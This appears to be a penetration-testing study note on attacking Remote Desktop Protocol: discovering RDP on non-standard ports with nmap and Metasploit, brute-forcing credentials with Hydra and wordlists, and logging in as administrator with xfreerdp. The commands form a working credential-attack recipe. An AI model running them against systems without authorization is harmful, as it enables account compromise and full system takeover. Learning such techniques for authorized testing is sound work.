# Workflow

## Key Facts

- **RDP (Remote Desktop Protocol)**: Microsoftâ€™s GUI remote access protocol  
- **Default Port**: `3389/TCP` â€” but **can run on any port**  
- **Authentication**: Requires **valid username + password** (cleartext)  
- **Goal**: Brute-force creds â†’ gain full desktop access as that user

---
## Step 1: Discover RDP (Not Just Port 3389!)

### Full Port Scan

```bash
nmap -sV -p- 192.168.1.10
```

â†’ May reveal RDP on non-standard port (e.g., `3333/tcp open  ms-wbt-server`)

### Verify Itâ€™s RDP
#### Option A: Nmap

```bash
nmap -sV -p 3333 --script=rdp-enum-encryption 192.168.1.10
```

#### Option B: Metasploit

```msf
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.10
set RPORT 3333
run
```

âœ… Output: `[+] 192.168.1.10:3333 - Detected RDP`

> ðŸ” Never assume RDP is only on 3389 â€” always scan all ports in black-box tests.

---
## Step 2: Brute-Force Credentials with Hydra

### Why Hydra?

- Supports **50+ protocols** (SSH, FTP, RDP, HTTP forms, SMB, etc.)
- Highly parallel, scriptable, and fast

### Command

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -s 3333 \
      -t 4 \
      rdp://192.168.1.10
```

### Flags Explained

| Flag      | Meaning                                           |
| --------- | ------------------------------------------------- |
| `-L`      | **username wordlist file**                        |
| `-P`      | **password wordlist file**                        |
| `-l`      | **username**                                      |
| `-p`      | **password**                                      |
| `-s 3333` | Specify **non-default port** (critical!)          |
| `-t 4`    | Limit to 4 parallel tasks (avoid crashing target) |

>âš ï¸ If you omit `-s`, Hydra assumes port `3389` â†’ **fails silently**.

---
## Step 3: Connect with Valid Creds

### Common Error

```text
freerdp: connection failed to establish
```

â†’ Likely because `xfreerdp` (not `freerdp`) is needed for modern RDP.

### Use xfreerdp (Kali default)

```bash
xfreerdp /u:administrator /p:qwertyuiop /v:192.168.1.10:3333
```

âœ… Success: Full graphical desktop session as `administrator`.

---
## Critical Notes

- RDP brute-forcing is **noisy** and may lock accounts â€” use carefully.
- Always **verify port** before attacking.
- Use **low thread count** (`-t 1â€“4`) to avoid DoS.
- RDP access = **full system control** if admin creds are obtained.

> ðŸ”¥ RDP = Windowsâ€™ front door. Find the key, walk right in.

